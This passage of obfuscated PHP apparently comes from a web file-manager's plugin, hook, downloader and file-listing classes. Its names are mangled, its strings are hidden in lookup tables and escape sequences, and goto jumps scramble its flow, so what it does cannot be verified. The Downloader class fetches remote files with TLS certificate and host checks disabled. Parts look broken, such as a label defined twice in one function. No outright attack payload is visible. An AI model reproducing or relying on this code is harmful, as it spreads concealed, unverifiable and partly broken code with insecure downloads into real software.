$Fѥ[237]($dů[$aΌ珦]); while ($aᗩ < 0) { $aᗩ += 64; } $B܋ .= $B著[$aᗩ]; } $F = $Fѥ[239]($B܋); goto a; b´: $aٚ = $Fѥ[17]($aٚ); $Aĉ = $aٚ[0]; $aٚ = $Fѥ[21]($aٚ, 1); goto Dǒ; Dǒ: $fسŃ = $Fѥ[236]($B著, $Aĉ); $dů = $Fѥ[83]($Aĉ . $Fѥ[83]($a . $Aĉ) . $a); $dů = $Fѥ[21]($dů, $fسŃ % 8, $fسŃ % 8 + 7); goto AԦ; F: default: $F = Mcrypt::decode($aٚ, $a . $f÷); break; } if ($aӿ - 1 > 0) { $F = $this->{$_SERVER[$f[1482]][124]}($F, $a, $aӿ - 1); } return $F; goto BٖՅ; BĪ₌: $aٚ = $Fѥ[230]($aٚ); $aٚ = $Fѥ[154]($aٚ); $a = $aٚ[0]; goto cǚ; cǚ: $f÷ = $Fѥ[21]($aٚ, 1, 15); $aٚ = $Fѥ[21]($aٚ, 16); $B著 = $Fѥ[231]; goto f䰍; BٖՅ: } public function appAllow($FӅٔ, $Aɐ, $dԞ = true) { $e媕 =& $_SERVER[拘]; $cʪ =& $_SERVER[$e媕[1482]]; $aǐ = PLUGIN_DIR . $FӅٔ . $cʪ[240]; if (!$cʪ[142]($Aɐ) || !$cʪ[142]($Aɐ[$cʪ[8]]) || !$cʪ[241]($aǐ) || $Aɐ[$cʪ[242]] != 1) { return !1; } if ($dԞ && !$cʪ[79]($cʪ[243])->{$_SERVER[$e媕[1482]][244]}($FӅٔ)) { return !1; } return !0; } public function unInstall($aբ͎˞) { $f =& $_SERVER[拘]; $E =& $_SERVER[$f[1482]]; $bɍ = $this->{$_SERVER[$f[1482]][3]}($aբ͎˞); if ($E[245](PLUGIN_DIR . $aբ͎˞)) { Hook::apply($aբ͎˞ . $E[247]); } $this->{$_SERVER[$f[1482]][200]}($bɍ[$E[163]]); } public function changeStatus($E䴑, $D) { $fʨ͇ =& $_SERVER[拘]; $EƢ =& $_SERVER[$fʨ͇[1482]]; $cŲ = $this->{$_SERVER[$fʨ͇[1482]][3]}($E䴑); if ($D) { Hook::apply($E䴑 . $EƢ[248]); } $this->{$_SERVER[$fʨ͇[1482]][162]}($cŲ[$EƢ[163]], array($EƢ[249] => $D)); } public function appRegist($BŚ, $Cۯڎ) { $D޽ =& $_SERVER[拘]; $Bܔ伲 =& $_SERVER[$D޽[1482]]; $C = $this->{$_SERVER[$D޽[1482]][3]}($BŚ); if ($C) { $this->{$_SERVER[$D޽[1482]][162]}($C[$Bܔ伲[163]], array($Bܔ伲[8] => $Cۯڎ)); } else { $a = array($Bܔ伲[2] => $BŚ, $Bܔ伲[8] => $Cۯڎ, $Bܔ伲[242] => 0, $Bܔ伲[62] => $this->{$_SERVER[$D޽[1482]][250]}($BŚ)); $this->{$_SERVER[$D޽[1482]][251]}($a); } } public function getConfigDefault($b愑) { goto bʍ; bʍ: $E =& $_SERVER[拘]; $B䏦 =& $_SERVER[$E[1482]]; $cڌ䈭 = array(); goto fӊ; fӊ: $bʂ = $this->{$_SERVER[$E[1482]][252]}($b愑); if (!$bʂ && $B䏦[142]($bʂ[$B䏦[253]])) { return $cڌ䈭; } foreach ($bʂ[$B䏦[253]] as $B掞 => $B) { if (!isset($B[$B䏦[254]]) || isset($cڌ䈭[$B掞])) { continue; } $cڌ䈭[$B掞] = $B[$B䏦[254]]; } goto c; c: return $cڌ䈭; goto d; d: } public function getPackageJson($b܅) { return Hook::apply($b܅ . $_SERVER[$_SERVER[拘][1482]][255]); } public function getConfig($dڶ, $f鳋 = false) { goto f; cЃ: return $E⻼; goto e˹; E: $a = $this->{$_SERVER[$AЙ[1482]][3]}($dڶ); if ($a && $a[142]($a[$a[62]])) { $E⻼ = $a[$a[62]]; } if (!$E⻼ || $f鳋) { $E⻼ = $this->{$_SERVER[$AЙ[1482]][250]}($dڶ); } goto cЃ; f: $AЙ =& $_SERVER[拘]; $a =& $_SERVER[$AЙ[1482]]; $E⻼ = array(); goto E; e˹: } public function setConfig($c, $Aфͤ = false) { goto a; e: if (!$Aޮ) { return !1; } if ($Aфͤ == !1) { $Aфͤ = $this->{$_SERVER[$cݬؚ[1482]][250]}($c); } $D = $Aޮ[$e[62]]; goto Fç; a: $cݬؚ =& $_SERVER[拘]; $e =& $_SERVER[$cݬؚ[1482]]; $Aޮ = $this->{$_SERVER[$cݬؚ[1482]][3]}($c); goto e; Fç: foreach ($Aфͤ as $c => $bޓ) { $D[$c] = $e[238]($bޓ) ? $e[230]($bޓ) : $bޓ; } $this->{$_SERVER[$cݬؚ[1482]][162]}($Aޮ[$e[163]], array($e[62] => $D)); goto E󆇕; E󆇕: } public function viewList() { goto f; aؼ: $bւ = $this->{$_SERVER[$A򦽟ل[1482]][6]}($bւ); $this->{$_SERVER[$A򦽟ل[1482]][256]}($bւ); $dёƵ = array(); goto E鐭; E鐭: foreach ($bւ as $d㐎 => $F) { unset($F[$F[8]], $F[$F[62]]); $e = PLUGIN_DIR . $F[$F[2]] . $F[240]; if (!$F[241]($e)) { continue; } $Aֆ = Hook::apply($F[$F[2]] . $F[255]); if ($F[142]($Aֆ)) { $dёƵ[$d㐎] = $F[257]($F, $Aֆ); } } return $dёƵ; goto a; f: $A򦽟ل =& $_SERVER[拘]; $F =& $_SERVER[$A򦽟ل[1482]]; $bւ = $this->{$_SERVER[$A򦽟ل[1482]][3]}(); goto aؼ; a: } private function pluginScan($C祻) { $E =& $_SERVER[$_SERVER[拘][1482]]; $E[258](PLUGIN_DIR, $Cѳ, $f, 0); foreach ($Cѳ as $B閠) { $eދ = $E[259]($B閠); if (isset($C祻[$eދ]) || !$E[245]($B閠 . $E[260]) || !$E[245]($B閠 . $E[240])) { continue; } Hook::apply($eދ . $E[248]); } } } goto dȴ; E: if ($_SERVER[拘][82]($_SERVER[拘][2191])) { class Services_JSON_Error extends PEAR_Error { function __construct($C׳ = "\165\156\153\x6e\x6f\167\156\40\145\162\162\157\162", $Aա = null, $a޻ = null, $Aǘ = null, $fӇ˽ = null) { parent::PEAR_Error($C׳, $Aա, $a޻, $Aǘ, $fӇ˽); } } } else { class Services_JSON_Error { function __construct($FǏ = "\165\x6e\153\x6e\x6f\x77\156\x20\145\162\x72\157\162", $Dۙ = null, $Bǖ = null, $fӄ = null, $b׿ = null) { } } } class Hook { private static $events = array(); public static function get($f܈ = false) { if (!$f܈) { return self::$events; } else { return self::$events[$f܈]; } } public static function apply($F䫋, $cò = array()) { $dÎí = $_SERVER[拘][2193]($F䫋, $cò); Hook::trigger($F䫋); return $dÎí; } public static function bind($EԺ, $Bֆ, $cķ = false) { $fڙϧ =& $_SERVER[拘]; if (!isset(self::$events[$EԺ])) { self::$events[$EԺ] = array(); } if (!$fڙϧ[93]($Bֆ)) { $Bֆ = array($Bֆ); } for ($E۷û = 0; $E۷û < $fڙϧ[37]($Bֆ); $E۷û++) { self::$events[$EԺ][] = array($fڙϧ[2194] => $Bֆ[$E۷û], $fڙϧ[2195] => $cķ, $fڙϧ[2196] => 0); } } public static function once($DǏ, $Aє) { self::bind($DǏ, $Aє, !0); } public static function unbind($E҂) { self::$events[$E҂] = !1; } public static function filter($Cܤ, $Cғ눬) { goto B; eꟾ: $aí = $D״[$Cܤ]; $e焓 = $Cғ눬; if (!$aϓ[93]($aí) || $aϓ[37]($aí) == 0) { return $e焓; } goto D; D: for ($aҾ = 0; $aҾ < $aϓ[37]($aí); $aҾ++) { $A = $aí[$aҾ]; if ($A[$aϓ[2195]] && $A[$aϓ[2196]] > 1) { continue; } self::$events[$Cܤ][$aҾ][$aϓ[2196]] = $A[$aϓ[2196]] + 1; $Cғ눬 = self::apply($A[$aϓ[2194]], array($Cғ눬)); $e焓 = $Cғ눬; } return $e焓; goto C≾܇; B: $aϓ =& $_SERVER[拘]; $D״ = self::$events; if (!isset($D״[$Cܤ])) { return $Cғ눬; } goto eꟾ; C≾܇: } public static function trigger($E) { goto A; Bͱ: return $a; goto dȊ; fʄǸߜ: $B = func_get_args(); $bʹ[1064]($B); for ($cĈ = 0; $cĈ < $bʹ[37]($b); $cĈ++) { $cװ = $b[$cĈ]; if ($cװ[$bʹ[2195]] && $cװ[$bʹ[2196]] > 1) { continue; } if ($bʹ[467]($bʹ[2197]) && GLOBAL_LOG_HOOK) { $bʹ[2198]($E . $bʹ[2199] . $cװ[$bʹ[2194]], $bʹ[2200]); } self::$events[$E][$cĈ][$bʹ[2196]] = $cװ[$bʹ[2196]] + 1; $eꢪ = self::apply($cװ[$bʹ[2194]], $B); if ($bʹ[467]($bʹ[2197]) && GLOBAL_LOG_HOOK) { $bʹ[2198]($bʹ[2201](), $bʹ[2200]); } if ($cװ[$bʹ[2196]] >= 200) { $bʹ[76]($bʹ[2202] . $E . $bʹ[2203] . $cװ[$bʹ[2194]]); } $a = !$bʹ[149]($eꢪ) ? $eꢪ : $a; } goto Bͱ; A: $bʹ =& $_SERVER[拘]; $Bηա = self::$events; if (!isset($Bηա[$E])) { return; } goto EȮŦ; EȮŦ: $b = $Bηա[$E]; $a = !1; if (!$bʹ[93]($b) || $bʹ[37]($b) == 0) { return $a; } goto fʄǸߜ; dȊ: } } class Downloader { static function start($Dꃭѷ, $A㑓, $b = 10) { goto dۋ; f: if ($BЌǆд[48]($A㑓) && $DϿͫ == $BЌǆд[598]($A㑓)) { @$BЌǆд[51]($Cن); @$BЌǆд[51]($D); return array($BЌǆд[731] => !0, $BЌǆд[733] => $BЌǆд[2211]); } if ($A㏼[$BЌǆд[956]] != $DϿͫ) { $A㏼ = array($BЌǆд[956] => $DϿͫ); } if ($Cΰ > $DϿͫ) { @$BЌǆд[51]($Cن); } goto d; Aį: if ($BЌǆд[48]($Cن) && $BЌǆд[50]() - $BЌǆд[49]($Cن) < 3) { return array($BЌǆд[731] => !1, $BЌǆд[733] => $BЌǆд[2210]); } $A㏼ = array(); if ($BЌǆд[585]($D)) { $cŔ = $BЌǆд[345]($D); $A㏼ = $BЌǆд[738]($cŔ, 1); } goto f; d: $BЌǆд[344]($D, $BЌǆд[297]($A㏼)); $Aڝٶ = self::fileDownloadCurl($Dꃭѷ, $A㑓, !0, $Cΰ, $DϿͫ); if ($Aڝٶ[$BЌǆд[731]]) { @$BЌǆд[51]($D); } goto b񷋷; AܢĂ: if (!$eࡇߞ[$BЌǆд[2207]] || $eࡇߞ[$BЌǆд[956]] == 0) { @$BЌǆд[51]($Cن); @$BЌǆд[51]($A㑓); $Aڝٶ = self::fileDownloadFopen($Dꃭѷ, $A㑓, $eࡇߞ[$BЌǆд[956]]); if ($Aڝٶ[$BЌǆд[731]]) { return $Aڝٶ; } else { @$BЌǆд[51]($Cن); @$BЌǆд[51]($A㑓); $Aڝٶ = self::fileDownloadCurl($Dꃭѷ, $A㑓, !1, 0, $eࡇߞ[$BЌǆд[956]]); @$BЌǆд[51]($Cن); @$BЌǆд[51]($A㑓); return $Aڝٶ; } } $Cΰ = $BЌǆд[585]($Cن) ? $BЌǆд[598]($Cن) : 0; $DϿͫ = $BЌǆд[455]($eࡇߞ[$BЌǆд[956]]); goto Aį; dۋ: $BЌǆд =& $_SERVER[拘]; $D = $A㑓 . $BЌǆд[2204]; $Cن = $A㑓 . $BЌǆд[2205]; goto C; b񷋷: return $Aڝٶ; goto cœ; C: if ($BЌǆд[93]($Dꃭѷ)) { $eࡇߞ = $Dꃭѷ; } else { $eࡇߞ = $BЌǆд[2206]($Dꃭѷ); } $Dꃭѷ = $eࡇߞ[$BЌǆд[906]]; if (!$Dꃭѷ) { return array($BЌǆд[731] => !1, $BЌǆд[733] => $BЌǆд[737]); } goto AܢĂ; cœ: } static function fileDownloadFopen($aǰĲ, $e, $C؛ = 0) { $fߦ =& $_SERVER[拘]; @$fߦ[2212]($fߦ[2213], $fߦ[2214]); $aŇ = $e . $fߦ[2205]; @$fߦ[647](0); @$fߦ[51]($aŇ); if ($bʰ = @$fߦ[53]($aǰĲ, $fߦ[2215])) { goto E; e: self::checkGzip($aŇ); if (!@$fߦ[588]($aŇ, $e)) { $fߦ[699]($fߦ[1919]($fߦ[2223](0, 1000) * 50)); @$fߦ[51]($e); $D = @$fߦ[588]($aŇ, $e); if (!$D) { return array($fߦ[731] => !1, $fߦ[733] => $fߦ[2224]); } } return array($fߦ[731] => !0, $fߦ[733] => $fߦ[954]); goto a; E: if (!($C = @$fߦ[53]($aŇ, $fߦ[2216]))) { return array($fߦ[731] => !1, $fߦ[733] => $fߦ[2217]); } while (!$fߦ[2218]($bʰ)) { if (!$fߦ[48]($aŇ)) { $fߦ[58]($C); return array($fߦ[731] => !1, $fߦ[733] => $fߦ[2219]); } $fߦ[2220](); if ($C؛ > 0 && $C؛ == $fߦ[598]($fߦ[2120]($aŇ))) { break; } $fߦ[55]($C, $fߦ[577]($bʰ, 1024 * 8), 1024 * 8); } $fߦ[58]($C); goto C; C: $fߦ[58]($bʰ); $BՅ = $fߦ[598]($fߦ[2120]($aŇ)); if ($C؛ != 0 && $BՅ != $C؛) { return array($fߦ[731] => !1, $fߦ[733] => $fߦ[2221]); } goto e; a: } else { return array($fߦ[731] => !1, $fߦ[733] => $fߦ[2225]); } } static function fileDownloadCurl($Aŵ, $d, $e = false, $dяØ = 0, $eهσ = 0) { goto cϒ; e: $Eƣ׷ = @$B[53]($E۩, $B[2226]); if (!$Eƣ׷) { return array($B[731] => !1, $B[733] => $B[2227]); } $c = $B[972]($Aŵ); goto cɉٯ; bΟϙ: $Eڦ = $B[598]($B[2120]($E۩)); if ($Eڦ < $eهσ && $eهσ != 0) { return array($B[731] => !1, $B[733] => $B[2210]); } if ($Eڦ > $eهσ && $eهσ != 0) { return array($B[731] => !1, $B[733] => $B[2221]); } goto fכ; cɉٯ: if ($e) { $B[973]($c, CURLOPT_RANGE, $dяØ . $B[2228]); } $B[973]($c, CURLOPT_FILE, $Eƣ׷); $B[973]($c, CURLOPT_REFERER, $B[2229]($Aŵ)); goto eѳꏖ; eѳꏖ: $B[973]($c, CURLOPT_SSL_VERIFYPEER, 0); $B[973]($c, CURLOPT_SSL_VERIFYHOST, 0); $B[973]($c, CURLOPT_USERAGENT, $B[2214]); goto b䒻; b䒻: $A = $B[974]($c); $B[975]($c); $B[58]($Eƣ׷); goto bΟϙ; fכ: if ($A && $B[598]($E۩) != 0) { self::checkGzip($E۩); if (!@$B[588]($E۩, $d)) { @$B[51]($d); $A = @$B[588]($E۩, $d); if (!$A) { return array($B[731] => !1, $B[733] => $B[2230]); } } return array($B[731] => !0, $B[733] => $B[954]); } return array($B[731] => !1, $B[733] => $B[2231]); goto F껯; cϒ: $B =& $_SERVER[拘]; $E۩ = $d . $B[2205]; @$B[647](0); goto e; F껯: } static function checkGzip($Aթ) { goto a; d: $BȻ높 = $E̎[2236](); $E̎[344]($Aթ, $BȻ높); goto F嬪; dɭ: if ($F꼻 != $Aˊ߅) { return; } $E̎[2234](); $E̎[2235]($Aթ); goto d; a: $E̎ =& $_SERVER[拘]; $F꼻 = $E̎[2232]; $Aˊ߅ = $E̎[2233]($Aթ, 0, 2); goto dɭ; F嬪: } } goto E۳; a: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\x72\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\x6d\145" => "\151\x6f\137\163\x6f\x75\x72\143\x65\x5f\x6d\x65\x74\x61", "\155\145\164\141\106\151\145\154\x64" => "\163\157\165\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\155\157\144\151\x66\171\124\x69\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\x65\x72\x74", "\146\165\156\x63\164\x69\157\x6e"), array("\143\162\x65\x61\x74\145\x54\151\155\x65", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\164", "\146\x75\x6e\x63\x74\x69\157\156"), array("\166\151\145\167\124\151\155\x65", "\x74\151\x6d\145", "\151\x6e\163\145\162\164", "\146\x75\x6e\x63\x74\151\x6f\x6e")); protected static $cacheSourceInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($BݎÜ) { $cĤܚ =& $_SERVER[拘]; $f = array($_SERVER[$cĤܚ[1457]][0] => $BݎÜ); return $this->{$_SERVER[$cĤܚ[1457]][1]}($f); } public function typeName($b癜) { static $D廄 = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\147\162\157\165\160"); return $D廄[$b癜 . $_SERVER[$_SERVER[拘][1457]][2]]; } public function sourceListInfo($Bꟃ) { goto D˸; D˸: $a =& $_SERVER[拘]; $bą =& $_SERVER[$a[1457]]; $Bꟃ = $bą[3]($Bꟃ); goto a; B: $this->{$_SERVER[$a[1457]][13]}($aɓ); foreach ($aɓ as &$A) { $A = $this->{$_SERVER[$a[1457]][14]}($A); } $F = $bą[15]($aɓ, $bą[5]); goto C턊µ; f: $this->{$_SERVER[$a[1457]][10]}($aɓ, $Bꟃ); $this->{$_SERVER[$a[1457]][11]}($aɓ, $Bꟃ); $this->{$_SERVER[$a[1457]][12]}($aɓ); goto B; C턊µ: return $F; goto fޙ; a: $aɓ = $this->{$_SERVER[$a[1457]][4]}(array($bą[5] => array($bą[6], $Bꟃ)))->{$_SERVER[$a[1457]][7]}(); $this->{$_SERVER[$a[1457]][8]}($aɓ); $this->{$_SERVER[$a[1457]][9]}($aɓ, $Bꟃ); goto f; fޙ: } public function pathInfoFilter($D) { goto Aھ; eŘْ: return $D; goto bɧ鄯; c: $D[$A˨[18]] = $D[$A˨[19]] == 1 ? $A˨[20] : $A˨[21]; $D[$A˨[22]] = $this->{$_SERVER[$bɋ[1457]][23]}($D[$A˨[22]]); if ($D[$A˨[19]] != 1) { $D[$A˨[24]] = $D[$A˨[25]]; unset($D[$A˨[25]]); } goto cּݧ; cּݧ: $B = $A˨[26]; $B .= $A˨[27]; $D = $A˨[28]($D, $A˨[29]($A˨[30], $B)); goto eŘْ; Aھ: $bɋ =& $_SERVER[拘]; $A˨ =& $_SERVER[$bɋ[1457]]; $D[$A˨[16]] = KodIO::make($D[$A˨[5]]); goto c; bɧ鄯: } public function listUserFav() { goto BȳԖ޵; BȳԖ޵: $eٶ؄ =& $_SERVER[拘]; $aݴ =& $_SERVER[$eٶ؄[1457]]; $B = $aݴ[31]($aݴ[32])->{$_SERVER[$eٶ؄[1457]][33]}(); goto E; B۬: $f͂ = $aݴ[15]($f͂[$aݴ[38]], $aݴ[5]); foreach ($B as &$d؄) { $d؄ = array($aݴ[39] => $d؄[$aݴ[40]], $aݴ[41] => $d؄[$aݴ[42]], $aݴ[43] => $d؄[$aݴ[16]], $aݴ[44] => $d؄[$aݴ[18]], $aݴ[45] => $d؄[$aݴ[46]], $aݴ[47] => $d؄[$aݴ[48]]); if ($d؄[$aݴ[18]] == $aݴ[35] && $f͂[$d؄[$aݴ[16]]]) { $d؄[$aݴ[49]] = $f͂[$d؄[$aݴ[16]]]; } } return $B; goto Cհ; E: $D盃 = $aݴ[34]($B, $aݴ[18], $aݴ[35]); $D盃 = $aݴ[15]($D盃, $aݴ[2], $aݴ[16]); if ($D盃) { $f͂ = $this->{$_SERVER[$eٶ؄[1457]][1]}(array($aݴ[36] => array($aݴ[37], $D盃))); } goto B۬; Cհ: } public function listUserTag($Cԧ̬) { goto f; CŇܮ: $cܳ = $d˚[34]($F, $d˚[51], $Cԧ̬); $cܳ = $d˚[15]($cܳ, $d˚[2], $d˚[16]); if (!$cܳ) { return array(); } goto eՒ; f: $Dҫܡ =& $_SERVER[拘]; $d˚ =& $_SERVER[$Dҫܡ[1457]]; $F = $d˚[31]($d˚[50])->{$_SERVER[$Dҫܡ[1457]][33]}(); goto CŇܮ; eՒ: $B׏ = array($d˚[36] => array($d˚[37], $cܳ)); return $this->{$_SERVER[$Dҫܡ[1457]][1]}($B׏); goto b; b: } public function listUserRecycle() { $cń =& $_SERVER[拘]; $DŶĴ =& $_SERVER[$cń[1457]]; $aݷ = $DŶĴ[31]($DŶĴ[52])->{$_SERVER[$cń[1457]][33]}(); if (!$aݷ) { return array(); } $aû = array($DŶĴ[36] => array($DŶĴ[37], $aݷ), $DŶĴ[53] => 1); return $this->{$_SERVER[$cń[1457]][1]}($aû); } public static function fileTypeWhere($Fܠ៝) { goto Fͫ; Fͫ: $F覑 =& $_SERVER[$_SERVER[拘][1457]]; $Fɂ = KodIO::fileTypeList(); $aܳ = $Fɂ[$Fܠ៝]; goto D; D: if (!$aܳ) { return array(); } $Bٴ = $aܳ[$F覑[24]]; $Cά = $F覑[6]; goto D; D: if (!$aܳ[$F覑[24]]) { $C = $F覑[15]($Fɂ, $F覑[2], $F覑[24]); $Bٴ = $F覑[55]($F覑[30], $C); $Cά = $F覑[56]; } $CΝ䬛 = $F覑[29]($F覑[30], $F覑[57]($Bٴ, $F覑[30])); return array($Cά, $CΝ䬛); goto E줍; E줍: } public function listPathType($f⹏) { $fڗ =& $_SERVER[拘]; $f핲 =& $_SERVER[$fڗ[1457]]; $c = $this->{$_SERVER[$fڗ[1457]][58]}($f⹏); if (!$c) { return array(); } $f = array($f핲[59] => SourceModel::TYPE_USER, $f핲[60] => USER_ID, $f핲[61] => 0, $f핲[62] => $c); return $this->{$_SERVER[$fڗ[1457]][1]}($f); } public function listSearch($E, $c = 300) { goto e; A: $this->{$_SERVER[$AͲ[1457]][73]}($c͢˃[$a[38]]); $this->{$_SERVER[$AͲ[1457]][74]}($c͢˃); return $c͢˃; goto B̓劲; B׮: $this->{$_SERVER[$AͲ[1457]][67]}($a[68])->{$_SERVER[$AͲ[1457]][69]}(); $this->{$_SERVER[$AͲ[1457]][70]}(null, 10); $c͢˃ = $this->{$_SERVER[$AͲ[1457]][71]}($aߊΛ)->{$_SERVER[$AͲ[1457]][4]}($E桳)->{$_SERVER[$AͲ[1457]][72]}($c); goto A; D㬏: if (!isset($E桳[$a[64]])) { $E桳[$a[64]] = 0; } $aߊΛ = $a[65]; $this->{$_SERVER[$AͲ[1457]][66]}($E, $E桳, $aߊΛ); goto B׮; e: $AͲ =& $_SERVER[拘]; $a =& $_SERVER[$AͲ[1457]]; $E桳 = $this->{$_SERVER[$AͲ[1457]][63]}($E); goto D㬏; B̓劲: } private function _listSearchBindPinyin($F㲡Ί, &$d, &$D٦) { goto aռՅϾ; cÌ҄: $f = "\x4c\105\x46\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\151\157\137\x73\x6f\165\x72\143\x65\137\155\145\164\141\x20\x6d\145\x74\141\40\157\156\x20\163\x6f\x75\162\143\x65\x2e\163\157\165\x72\143\145\x49\x44\x20\75\x20\155\x65\x74\141\56\163\157\x75\162\143\x65\111\x44"; $D芜 = array(); $D٦ = $F[79](array($F[80], $F[81], $F[82]), $F[2], $D٦); goto eРź; D: $c = array($F[85], $F[86] . $F㲡Ί[$F[76]] . $F[86]); $D芜[] = array($F[87] => $c, $F[88] => $F[89], array($F[90] => $c, $F[91] => array($F[6], array($F[92], $F[93])))); $this->{$_SERVER[$fĚ[1457]][94]}($f); goto c㎳; c㎳: $d = $D芜; goto F; eРź: $D٦ = $F[83] . $F[79]($F[30], $F[84], $D٦); unset($d[$F[42]]); foreach ($d as $C => $aǛ) { $D芜[$F[83] . $C] = $aǛ; } goto D; aռՅϾ: $fĚ =& $_SERVER[拘]; $F =& $_SERVER[$fĚ[1457]]; if (!Input::check($F㲡Ί[$F[76]], $F[77]) || $F[78]($F㲡Ί[$F[76]]) < 2) { return; } goto cÌ҄; F: } private function _parseSearchWhere($C˲) { goto d̺ڋ; Bۙ: if (isset($C˲[$Aׂŝ[105]])) { $D߅ = array($Aׂŝ[103], $C˲[$Aׂŝ[105]]); if ($dӆ[$Aׂŝ[106]]) { $dӆ[$Aׂŝ[106]] = array($dӆ[$Aׂŝ[106]], $D߅, $Aׂŝ[104]); } else { $dӆ[$Aׂŝ[106]] = $D߅; } } if (isset($C˲[$Aׂŝ[107]])) { $dӆ[$Aׂŝ[106]] = array($Aׂŝ[101], $C˲[$Aׂŝ[107]]); } if (isset($C˲[$Aׂŝ[108]])) { $dӆ[$Aׂŝ[108]] = $C˲[$Aׂŝ[108]]; } goto B; d̺ڋ: $Bո =& $_SERVER[拘]; $Aׂŝ =& $_SERVER[$Bո[1457]]; $dӆ = array(); goto eƫ; B: if (isset($C˲[$Aׂŝ[109]])) { $dӆ[$Aׂŝ[109]] = $C˲[$Aׂŝ[109]]; } $dӆ[$Aׂŝ[19]] = 0; if (isset($C˲[$Aׂŝ[25]])) { if ($C˲[$Aׂŝ[25]] == $Aׂŝ[20]) { $dӆ[$Aׂŝ[19]] = 1; } else { $dӆ[$Aׂŝ[25]] = array($Aׂŝ[37], $C˲[$Aׂŝ[25]]); } } goto bΑ; bΑ: if (isset($C˲[$Aׂŝ[76]])) { $dӆ[$Aׂŝ[42]] = array($Aׂŝ[85], $Aׂŝ[86] . $C˲[$Aׂŝ[76]] . $Aׂŝ[86]); } return $dӆ; goto fع; eƫ: if (isset($C˲[$Aׂŝ[95]])) { $c = $this->{$_SERVER[$Bո[1457]][96]}($C˲[$Aׂŝ[95]]); $dӆ[$Aׂŝ[97]] = array($Aׂŝ[85], $c[$Aׂŝ[98]] . $C˲[$Aׂŝ[95]] . $Aׂŝ[99]); } if (isset($C˲[$Aׂŝ[100]])) { $dӆ[$Aׂŝ[48]] = array($Aׂŝ[101], $C˲[$Aׂŝ[100]]); } if (isset($C˲[$Aׂŝ[102]])) { $D߅ = array($Aׂŝ[103], $C˲[$Aׂŝ[102]]); if ($dӆ[$Aׂŝ[48]]) { $dӆ[$Aׂŝ[48]] = array($dӆ[$Aׂŝ[48]], $D߅, $Aׂŝ[104]); } else { $dӆ[$Aׂŝ[48]] = $D߅; } } goto Bۙ; fع: } public function listSource($A, $f = 300) { goto C鑌; C: $bӴ = $dѫƒ[65]; $dڌ = $this->{$_SERVER[$aߠ֋[1457]][71]}($bӴ)->{$_SERVER[$aߠ֋[1457]][69]}()->{$_SERVER[$aߠ֋[1457]][4]}($A)->{$_SERVER[$aߠ֋[1457]][72]}($f); $this->{$_SERVER[$aߠ֋[1457]][73]}($dڌ[$dѫƒ[38]]); goto f٦; C鑌: $aߠ֋ =& $_SERVER[拘]; $dѫƒ =& $_SERVER[$aߠ֋[1457]]; if (!isset($A[$dѫƒ[64]])) { $A[$dѫƒ[64]] = 0; } goto C; f٦: $this->{$_SERVER[$aߠ֋[1457]][74]}($dڌ); return $dڌ; goto Fڳ; Fڳ: } private function _makeOrder() { goto a; b갥: $Bǐɉ = $cǾ[31]($cǾ[110])->{$_SERVER[$cیح[1457]][111]}($cǾ[113]); $bڝ = array($cǾ[114] => $cǾ[115], $cǾ[116] => $cǾ[117]); $a = array($cǾ[42] => $cǾ[42], $cǾ[106] => $cǾ[106], $cǾ[24] => $cǾ[25], $cǾ[108] => $cǾ[108], $cǾ[118] => $cǾ[109], $cǾ[46] => $cǾ[46], $cǾ[48] => $cǾ[48]); goto D; b: return $this->{$_SERVER[$cیح[1457]][124]}($cǾ[125]($cǾ[57]($cу), $cǾ[30])); goto A; D: $d = Input::get($cǾ[119], $cǾ[6], $E, $cǾ[120]($a)); $aΒસ = Input::get($cǾ[121], $cǾ[6], $Bǐɉ, $cǾ[120]($bڝ)); if (!$cǾ[122]($d, $cǾ[120]($a))) { $d = $cǾ[42]; } goto Fڌ; Fڌ: if (!$cǾ[122]($aΒસ, $cǾ[120]($bڝ))) { $d = $cǾ[114]; } if ($d == $cǾ[42]) { } $cу = $cǾ[123] . $a[$d] . $cǾ[81] . $bڝ[$aΒસ]; goto b; a: $cیح =& $_SERVER[拘]; $cǾ =& $_SERVER[$cیح[1457]]; $E = $cǾ[31]($cǾ[110])->{$_SERVER[$cیح[1457]][111]}($cǾ[112]); goto b갥; A: } protected function _listDataApplyItem($EגۃԆ, $AЎ = false) { goto bݜ; bݜ: $D˲ž =& $_SERVER[拘]; $B = array($EגۃԆ); $C܄Π = array($EגۃԆ[$_SERVER[$D˲ž[1457]][5]]); goto Eڕ; Eڕ: $this->{$_SERVER[$D˲ž[1457]][8]}($B); if (!$AЎ) { $this->{$_SERVER[$D˲ž[1457]][9]}($B, $C܄Π); $this->{$_SERVER[$D˲ž[1457]][11]}($B, $C܄Π); $this->{$_SERVER[$D˲ž[1457]][13]}($B); } $this->{$_SERVER[$D˲ž[1457]][10]}($B, $C܄Π); goto E侲; E侲: $this->{$_SERVER[$D˲ž[1457]][12]}($B); $Eɇ = $this->{$_SERVER[$D˲ž[1457]][14]}($B[0]); return $Eɇ; goto F; F: } protected function _listDataApply(&$e) { goto FѦ; Eޏ: $this->{$_SERVER[$f֔[1457]][9]}($e, $eͭ); $this->{$_SERVER[$f֔[1457]][10]}($e, $eͭ); $this->{$_SERVER[$f֔[1457]][11]}($e, $eͭ); goto cӂ; cӂ: $this->{$_SERVER[$f֔[1457]][12]}($e); $this->{$_SERVER[$f֔[1457]][13]}($e); goto E; C҉̐: $eͭ = $b٦[15]($e, $b٦[2], $b٦[5]); $eͭ = $b٦[3]($eͭ); $this->{$_SERVER[$f֔[1457]][8]}($e); goto Eޏ; FѦ: $f֔ =& $_SERVER[拘]; $b٦ =& $_SERVER[$f֔[1457]]; if (!$e) { $e = array(); return; } goto C҉̐; E: } protected function _listFilterInfo(&$cփ) { $Fů =& $_SERVER[拘]; $B۳ =& $_SERVER[$Fů[1457]]; $cփ[$B۳[126]] = array(); $cփ[$B۳[127]] = array(); foreach ($cփ[$B۳[38]] as $fͱ) { $bԨ = $fͱ[$B۳[19]] == 1 ? $B۳[126] : $B۳[127]; $cփ[$bԨ][] = $this->{$_SERVER[$Fů[1457]][14]}($fͱ); } 